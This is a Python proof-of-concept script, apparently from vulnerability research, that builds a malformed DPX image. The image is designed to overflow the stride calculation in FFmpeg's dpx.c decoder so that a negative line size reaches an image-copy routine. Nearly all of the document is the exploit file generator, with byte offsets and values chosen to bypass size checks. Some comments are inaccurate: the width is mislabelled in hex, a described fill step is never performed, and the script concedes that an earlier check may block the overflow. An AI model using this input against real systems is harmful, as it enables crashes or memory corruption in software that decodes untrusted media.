#!/usr/bin/env python3
"""
PoC generator for VULN 002: Integer overflow in dpx->stride computation.

Attack vector: crafted DPX file with descriptor=51 (RGBA), bits=32,
width=268435327, so that 4 * width * 4 = 4,294,965,232 overflows INT_MAX,
wrapping to -2064.

This negative stride bypasses the size check at line 630 of libavcodec/dpx.c
and is passed to av_image_copy_plane() as src_linesize.

Key byte offsets discovered from tracing decode_frame() in dpx.c:
  [0:4]   = 0x53445058  SDPX magic (big-endian)
  [4:8]   = 2048        image data offset (big-endian, since endian=1)
  [8:12]  = 'V2.0'      version (read as little-endian MKTAG)
  [660:664] = 0xFFFFFFFF  no encryption
  [772:776] = 268435327   width (big-endian) -- 0x304 in hex
  [776:780] = 2           height (big-endian)
  [800]   = 51            descriptor (RGBA, 4 components)
  [801]   = 0             transfer characteristic
  [802]   = 0             colorimetric
  [803]   = 32            bits per component (triggers stride=4*w*4 overflow)
  [804:806] = 0           packing
  [806:808] = 0           encoding

Expected stride overflow:
  dpx->stride = 4 * 268435327 * 4 = 4,294,965,232 (> INT_MAX=2,147,483,647)
  In 32-bit signed int: wraps to -2064

Note: avctx->bits_per_raw_sample > 31 check at line 369 may intercept bits=32
before the stride computation is reached. See vuln_002_notes.md for analysis.
"""

import struct

IMAGE_DATA_OFFSET = 2048
WIDTH  = 268435327   # 0x0FFFFFFF -- close to av_image_check_size2 limit
HEIGHT = 2
DESCRIPTOR = 51      # RGBA
BITS   = 32

# Total file size: header (2048) + small fake pixel data (16 bytes)
TOTAL_SIZE = IMAGE_DATA_OFFSET + 16

header = bytearray(TOTAL_SIZE)

# [0:4]  Magic: "SDPX" big-endian (endian flag = 1 = big-endian)
struct.pack_into('>I', header, 0, 0x53445058)

# [4:8]  Offset to image data (big-endian)
struct.pack_into('>I', header, 4, IMAGE_DATA_OFFSET)

# [8:12] Header format version -- read as little-endian MKTAG
# MKTAG('V','2','.','0') with AV_RL32 means bytes are stored as 'V','2','.','0'
header[8]  = ord('V')
header[9]  = ord('2')
header[10] = ord('.')
header[11] = ord('0')

# [16:20] Total file size (big-endian) -- informational
struct.pack_into('>I', header, 16, TOTAL_SIZE)

# [660:664] Encryption key -- 0xFFFFFFFF means no encryption
struct.pack_into('>I', header, 660, 0xFFFFFFFF)

# [772:776] Width (pixels per line), big-endian -- 0x304 offset
struct.pack_into('>I', header, 772, WIDTH)

# [776:780] Height (lines per element), big-endian
struct.pack_into('>I', header, 776, HEIGHT)

# After reading w and h, decode_frame does buf += 20, landing at offset 800:
# [800]   Descriptor  (uint8)  -- 51 = RGBA (4 components)
header[800] = DESCRIPTOR

# [801]   Transfer characteristic (uint8) -- 0 = unspecified
header[801] = 0

# [802]   Colorimetric spec (uint8) -- 0 = unspecified
header[802] = 0

# [803]   Bit depth per component (uint8) -- 32 triggers case 32 stride math
header[803] = BITS

# [804:806] Packing (uint16 BE) -- 0 = packed 32-bit words
struct.pack_into('>H', header, 804, 0)

# [806:808] Encoding (uint16 BE) -- 0 = no encoding (RLE etc disabled)
struct.pack_into('>H', header, 806, 0)

# Offset to data within image element (informational, big-endian)
struct.pack_into('>I', header, 808, IMAGE_DATA_OFFSET)

# Fill the first 1624 bytes beyond offset 440 with 0xFF in the SAR region
# to avoid any incidental check on sample aspect ratio
# (avpkt->data+1628 and 1632 are read for SAR; leave as 0 = SAR disabled)

# Tiny pixel data region at IMAGE_DATA_OFFSET: 16 bytes of zeros
# (actual pixel data area -- intentionally minimal)

output_path = 'vuln_002_input.dpx'
with open(output_path, 'wb') as f:
    f.write(header)

print(f"[+] Written {TOTAL_SIZE} bytes to {output_path}")
print(f"[+] Width={WIDTH}, Height={HEIGHT}, Descriptor={DESCRIPTOR}, Bits={BITS}")
print(f"[+] Expected stride overflow: 4 * {WIDTH} * 4 = {4 * WIDTH * 4}")
import ctypes
stride_int = ctypes.c_int32(4 * WIDTH * 4).value
print(f"[+] As signed int32: {stride_int}")
